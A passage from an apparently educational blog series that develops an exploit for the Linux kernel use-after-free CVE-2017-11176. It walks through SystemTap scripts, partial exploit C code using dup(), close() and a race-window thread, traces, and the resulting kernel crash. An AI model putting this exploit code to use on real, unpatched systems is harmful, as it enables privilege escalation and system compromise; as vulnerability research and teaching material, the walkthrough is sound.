  struct netlink_sock *nlk <span class="o">=</span> <span class="o">(</span>void*<span class="o">)</span> sk<span class="p">;</span>
  nlk-&gt;state <span class="p">|</span><span class="o">=</span> <span class="m">1</span><span class="p">;</span>   // enter the netlink_attachskb<span class="o">()</span> retry path    

  // NOTE: We <span class="k">do</span> not mark the sock as DEAD anymore
%<span class="o">}</span>

<span class="k">function</span> force_trigger_after:long <span class="o">(</span>arg_sock:long<span class="o">)</span>
%<span class="o">{</span>
  struct files_struct *files <span class="o">=</span> current-&gt;files<span class="p">;</span>
  struct fdtable *fdt <span class="o">=</span> files_fdtable<span class="o">(</span>files<span class="o">)</span><span class="p">;</span>
  fdt-&gt;fd<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span> // makes the second call to fget<span class="o">()</span> fails
%<span class="o">}</span>


probe kernel.function <span class="o">(</span><span class="s2">"netlink_attachskb"</span><span class="o">)</span>
<span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
  <span class="o">{</span>
    force_trigger_before<span class="o">(</span><span class="nv">$sk</span><span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>

probe kernel.function <span class="o">(</span><span class="s2">"netlink_attachskb"</span><span class="o">)</span>.return
<span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
  <span class="o">{</span>
    force_trigger_after<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>As always, add some more probes so we can see the code flowing. This gives us the following output:</p><div class="highlight"><pre><span></span><code>$ ./exploit 
-<span class="o">={</span> CVE-2017-11176 Exploit <span class="o">}=</span>-
netlink socket <span class="nv">created</span> <span class="o">=</span> <span class="m">3</span>
creating unblock thread...
unblocking thread has been created!
get ready to block

<span class="o">&lt;&lt;&lt;</span> we get stuck here during ~5secs &gt;&gt;&gt;

<span class="o">[</span>unblock<span class="o">]</span> unblocking now
mq_notify: Bad file descriptor
exploit failed!

<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>SYSCALL<span class="o">]</span> <span class="o">==</span>&gt;&gt; mq_notify <span class="o">(</span>-1, 0x7fffbd130e30<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> <span class="o">==</span>&gt;&gt; alloc_skb <span class="o">(</span><span class="nv">priority</span><span class="o">=</span>0xd0 <span class="nv">size</span><span class="o">=</span>0x20<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>uland<span class="o">]</span> <span class="o">==</span>&gt;&gt; copy_from_user <span class="o">()</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> <span class="o">==</span>&gt;&gt; skb_put <span class="o">(</span><span class="nv">skb</span><span class="o">=</span>0xffff8800302551c0 <span class="nv">len</span><span class="o">=</span>0x20<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>skb<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">skb_put</span> <span class="o">=</span> ffff88000a015600
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>vfs<span class="o">]</span> <span class="o">==</span>&gt;&gt; fget <span class="o">(</span><span class="nv">fd</span><span class="o">=</span>0x3<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>vfs<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">fget</span> <span class="o">=</span> ffff8800314869c0
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_getsockbyfilp <span class="o">(</span><span class="nv">filp</span><span class="o">=</span>0xffff8800314869c0<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_getsockbyfilp</span> <span class="o">=</span> ffff8800300ef800
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_attachskb <span class="o">(</span><span class="nv">sk</span><span class="o">=</span>0xffff8800300ef800 <span class="nv">skb</span><span class="o">=</span>0xffff8800302551c0 <span class="nv">timeo</span><span class="o">=</span>0xffff88000b157f40 <span class="nv">ssk</span><span class="o">=</span>0x0<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> <span class="o">==</span>&gt;&gt; schedule_timeout <span class="o">(</span><span class="nv">timeout</span><span class="o">=</span>0x7fffffffffffffff<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> <span class="o">==</span>&gt;&gt; schedule <span class="o">()</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> <span class="o">==</span>&gt;&gt; deactivate_task <span class="o">(</span><span class="nv">rq</span><span class="o">=</span>0xffff880003c1f3c0 <span class="nv">p</span><span class="o">=</span>0xffff880031512200 <span class="nv">flags</span><span class="o">=</span>0x1<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">deactivate_task</span> <span class="o">=</span> 

<span class="o">&lt;&lt;&lt;</span> we get stuck here during ~5secs &gt;&gt;&gt;

<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">schedule</span> <span class="o">=</span> 
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>sched<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">schedule_timeout</span> <span class="o">=</span> 7fffffffffffffff
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">netlink_attachskb</span> <span class="o">=</span> <span class="m">1</span>              // &lt;----- returned <span class="m">1</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>vfs<span class="o">]</span> <span class="o">==</span>&gt;&gt; fget <span class="o">(</span><span class="nv">fd</span><span class="o">=</span>0x3<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>vfs<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">fget</span> <span class="o">=</span> <span class="m">0</span>                               // &lt;----- returned <span class="m">0</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> <span class="o">==</span>&gt;&gt; netlink_detachskb <span class="o">(</span><span class="nv">sk</span><span class="o">=</span>0xffff8800300ef800 <span class="nv">skb</span><span class="o">=</span>0xffff8800302551c0<span class="o">)</span>
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>netlink<span class="o">]</span> &lt;&lt;<span class="o">==</span> netlink_detachskb
<span class="o">(</span><span class="m">15981</span>-15981<span class="o">)</span> <span class="o">[</span>SYSCALL<span class="o">]</span> &lt;&lt;<span class="o">==</span> <span class="nv">mq_notify</span><span class="o">=</span> -9
</code></pre></div><p><strong>NOTE</strong>: The other thread traces have been removed for clarity.</p><p>Perfect! We stay stuck inside netlink_attachskb() during 5 seconds, we unblock it from the other thread and it returns 1 (as expected)!</p><p>In this section, we saw how to control the race and extend the window indefinitely (we reduced it to 5 seconds). Then we saw how to wake up the main thread by using setsockopt(). We also covered a "race" that could happen in our exploit (uh!) and we saw how we could reduce its occurrence probability with a simple trick. Finally, we removed one of the requirements implemented by the stap script (mark the SOCK as dead) using only user-land code. There are still two more requirements to implement.</p><hr><h1 id="making-fget-fail-on-second-loop">Making <em>fget()</em> Fail on Second Loop</h1><p>So far, we implemented one of the three requirements in userland. Here is our TODO list:</p><ol><li><strong>Force netlink_attachskb() to return 1</strong></li><li>[DONE] Unblock the exploit thread</li><li><strong>Force the second fget() call to return NULL</strong></li></ol><p>In this section, we will try to force the second fget() call to return NULL. It will allow to go to the "exit path" during the second loop:</p><div class="highlight"><pre><span></span><code><span class="nl">retry</span><span class="p">:</span><span class="w"></span>
<span class="w">            </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">notification</span><span class="p">.</span><span class="n">sigev_signo</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">filp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBADF</span><span class="p">;</span><span class="w"></span>
<span class="w">                </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w">           </span><span class="c1">// &lt;--------- on the second loop only!</span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
</code></pre></div><h2 id="why-does-fget-return-null">Why does fget() return NULL?</h2><p>With System Tap, we saw that resetting the FDT's entry of our target file descriptor was enough to make fget() fail (i.e. return NULL):</p><div class="highlight"><pre><span></span><code>struct files_struct *files <span class="o">=</span> current-&gt;files<span class="p">;</span>
struct fdtable *fdt <span class="o">=</span> files_fdtable<span class="o">(</span>files<span class="o">)</span><span class="p">;</span>
fdt-&gt;fd<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span> // makes the second call to fget<span class="o">()</span> fails
</code></pre></div><p>What <strong>fget()</strong> does is:</p><ol><li>Retrieves the "struct files_struct" of the <em>current</em> process</li><li>Retrieves the "struct fdtable" from the files_struct</li><li>Get the value of "fdt-&gt;fd[fd]" (i.e. a "struct file" pointer)</li><li>Increments the "struct file" refcounter (if not NULL) by one</li><li>Returns the "struct file" pointer</li></ol><p>In short, if a particular file descriptor's FDT entry is NULL, fget() returns NULL.</p><p><strong>NOTE</strong>: If you do not remember the relationship between all those structures, please go back to <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">Core Concept #1</a>.</p><h2 id="reset-an-entry-in-the-file-descriptor-table">Reset an Entry in the File Descriptor Table</h2><p>In the stap script, we reset the fdt entry for file descriptor "3" (cf. previous section). How can we do it from userland? What sets a FDT entry to NULL? <strong>Answer: The close() syscall.</strong></p><p>Here is a simplified version (without locking and error handling):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [fs/open.c]</span>

<span class="w">    </span><span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">close</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">filp</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">files_struct</span><span class="w"> </span><span class="o">*</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current</span><span class="o">-&gt;</span><span class="n">files</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">fdtable</span><span class="w"> </span><span class="o">*</span><span class="n">fdt</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">retval</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="n">fdt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">files_fdtable</span><span class="p">(</span><span class="n">files</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="n">filp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fdt</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">[</span><span class="n">fd</span><span class="p">];</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">   </span><span class="n">rcu_assign_pointer</span><span class="p">(</span><span class="n">fdt</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">[</span><span class="n">fd</span><span class="p">],</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;----- equivalent to: fdt-&gt;fd[fd] = NULL</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">   </span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filp_close</span><span class="p">(</span><span class="n">filp</span><span class="p">,</span><span class="w"> </span><span class="n">files</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">retval</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The close() syscall:</p><ul><li>[0] - retrieves the current process' FDT</li><li>[1] - retrieves the struct file pointer associated to a fd using the FDT</li><li>[2] - <strong>resets the FDT entry to NULL (unconditionally)</strong></li><li>[3] - drops a reference from the file object (i.e. calls fput())</li></ul><p>Nice, we have an easy way to (unconditionally) reset a FDT entry. However, it brings another problem...</p><h2 id="an-egg-and-chicken-issue">An Egg and Chicken Issue...</h2><p>It would be tempting to <em>just</em> call close() in the <em>unblock_thread</em> before calling setsockopt(). The problem is that setsockopt() needs a valid file descriptor! We <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#update-the-stap-script">already experienced it</a> with system tap, that's why we moved the "fdt reset code" while returning from netlink_attachskb(), instead of before. We have the same issue in userland...</p><p>What about calling close() <em>after</em> setsocktopt()? If we call close() <em>after</em> calling setsockopt() (unblocking the main thread) <strong>we don't profit of our extended windows</strong>. In other words, we fallback into the "small window" scenario. We do not want that.</p><p>Fortunately there is a way! In <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">Core Concept #1</a>, it has been said that the file descriptor table is <strong>not a 1:1 mapping</strong>. That is, several file descriptors might point to the same file object. How to make a struct file pointed by two file descriptors? <strong>The dup() syscall</strong>.</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// [fs/fcntl.c]</span>

<span class="w">    </span><span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">dup</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">fildes</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EBADF</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fget</span><span class="p">(</span><span class="n">fildes</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">file</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_unused_fd</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">       </span><span class="n">fd_install</span><span class="p">(</span><span class="n">ret</span><span class="p">,</span><span class="w"> </span><span class="n">file</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;----- equivalent to: current-&gt;files-&gt;fdt-&gt;fd[ret] = file</span>
<span class="w">        </span><span class="k">else</span><span class="w"></span>
<span class="w">          </span><span class="n">fput</span><span class="p">(</span><span class="n">file</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Yet another simple syscall, dup() does exactly what we want:</p><ul><li>[0] - takes a reference on a struct file object from a file descriptor</li><li>[1] - picks the next "unused/available" file descriptor</li><li>[2] - sets the fdt entry of this new file descriptor with a pointer to the struct file object</li><li>[3] - returns the new fd</li></ul><p>In the end, we will have two file descriptors that refer to the same struct file:</p><ul><li><strong>sock_fd</strong>: used by mq_notify() and close()</li><li><strong>unblock_fd</strong>: used by setsockopt()</li></ul><h2 id="updating-the-exploit_1">Updating the Exploit</h2><p>Let's update the exploit (adding close/dup calls and change setsockopt() parameters):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">unblock_thread_arg</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">unblock_fd</span><span class="p">;</span><span class="w">     </span><span class="c1">// &lt;----- used by the "unblock_thread"</span>
<span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">is_ready</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="nf">unblock_thread</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="w"> </span><span class="c1">// gives some time for the main thread to block</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[unblock] closing %d fd</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">_close</span><span class="p">(</span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">);</span><span class="w">                               </span><span class="c1">// &lt;----- close() before setsockopt()</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[unblock] unblocking now</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">uta</span><span class="o">-&gt;</span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w">       </span><span class="c1">// &lt;----- use "unblock_fd" now!</span>
<span class="w">                  </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">uta</span><span class="p">.</span><span class="n">unblock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_dup</span><span class="p">(</span><span class="n">uta</span><span class="p">.</span><span class="n">sock_fd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">         </span><span class="c1">// &lt;----- dup() after socket() </span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"dup"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[main] netlink fd duplicated = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">uta</span><span class="p">.</span><span class="n">unblock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Remember to remove the lines that reset the FDT entry in stap scripts, and launch:</p><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
[main] netlink socket created = 3
[main] netlink fd duplicated = 4
[main] creating unblock thread...
[main] unblocking thread has been created!
[main] get ready to block
[unblock] closing 3 fd
[unblock] unblocking now
mq_notify: Bad file descriptor
exploit failed!

&lt;&lt;&lt; KERNEL CRASH &gt;&gt;&gt;
</code></pre></div><p><strong>ALERT COBRA: our first kernel crash! Yes, we are now triggering the use-after-free</strong>.</p><p>The reason why we crash will be studied in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>.</p><p><em>Long story short: because of dup(), calling close() will not release a reference on netlink_sock object. It is the netlink_detachskb() that actually releases the last reference on netlink_sock (and frees it). In the end, the use-after-free is triggered during program exit, while releasing the "unblock_fd" file descriptor (in netlink_release()).</em></p><p>Great! We already fixed two necessary conditions to trigger the bug <strong>without</strong> System Tap. Let's move on and implement the last requirements.</p><hr><h1 id="looping-back-to-retry-label">Looping back to "retry" label</h1><p>This section might look like a <em>brutal</em> kernel code unrolling. Don't get scared! We are one-step away from the complete proof-of-concept code. As the proverb says: "<em>Eat the elephant one bite at a time</em>."</p><p>Alright, let's have a look at our TODO list:</p><ol><li><strong>Force netlink_attachskb() to return 1</strong></li><li>[DONE] Unblock the exploit thread</li><li>[DONE] Force the second fget() call to return NULL</li></ol><p>In order to reach the <strong>retry path</strong>, it is required that <strong>netlink_attachskb()</strong> returns 1. The only way to do it requires that we pass the first condition and unblock the thread (we did this already):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_attachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">// ... cut ...</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="c1">// normal path</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The condition [0] is true if:</p><ol><li>the <strong>sk_rmem_alloc</strong> value is <em>greater</em> than <strong>sk_rcvbuf</strong>, or...</li><li>...the lowest significant bit of <strong>nlk-&gt;state</strong> is set.</li></ol><p>Right now, we force it to be true by setting the LSB of "nlk-&gt;state" with stap:</p><div class="highlight"><pre><span></span><code>struct sock *sk = (void*) STAP_ARG_arg_sock;
struct netlink_sock *nlk = (void*) sk;
nlk-&gt;state |= 1;            
</code></pre></div><p>However, marking the socket state as "congested" (LSB set) is a bit tedious. The kernel path that sets this bit can only be reached because of memory allocation failure. It will put the system into an unstable state that is not suitable for exploitation. Well, there are other paths (without memory failure) but then we are already satisfying the condition... so it will be useless.</p><p>Instead, we will try to increase the <strong>sk_rmem_alloc</strong> value which represents the "current" size of the sock's receive buffer.</p><h2 id="filling-the-receive-buffer">Filling The Receive Buffer</h2><p>In this section, we will try to satisfy the first condition which means "is the receive buffer full?":</p><div class="highlight"><pre><span></span><code><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"></span>
</code></pre></div><p>As a reminder, a struct sock (embedded in netlink_sock) has the following fields:</p><ul><li><strong>sk_rcvbuf</strong>: "theorical" max size of the receive buffer (in bytes)</li><li><strong>sk_rmem_alloc</strong>: "current" size of the receive buffer (in bytes)</li><li><strong>sk_receive_queue</strong>: double-linked list of "skb" (i.e. network buffers)</li></ul><p><strong>NOTE</strong>: The sk_rcvbuf is "theorical" because the receive buffer "current" size can actually go beyond it.</p><p>While dumping the netlink sock structure with stap (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>) we had:</p><div class="highlight"><pre><span></span><code>- sk-&gt;sk_rmem_alloc = 0
- sk-&gt;sk_rcvbuf = 133120
</code></pre></div><p>There are two ways to make this condition true:</p><ol><li>lowering sk_rcvbuf below 0 (sk_rcvbuf type is <em>int</em> in our kernel version)</li><li>increasing sk_rmem_alloc above 133120</li></ol><h2 id="lowering-sk_rcvbuf">Lowering sk_rcvbuf</h2><p>The <em>sk_rcvbuf</em> is something common to all sock objects. There are not much places where this value is modified (with netlink sockets). One is <strong>sock_setsockopt</strong> (accessible with SOL_SOCKET parameter):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [net/core/sock.c]</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">sock_setsockopt</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">val</span><span class="p">;</span><span class="w"></span>

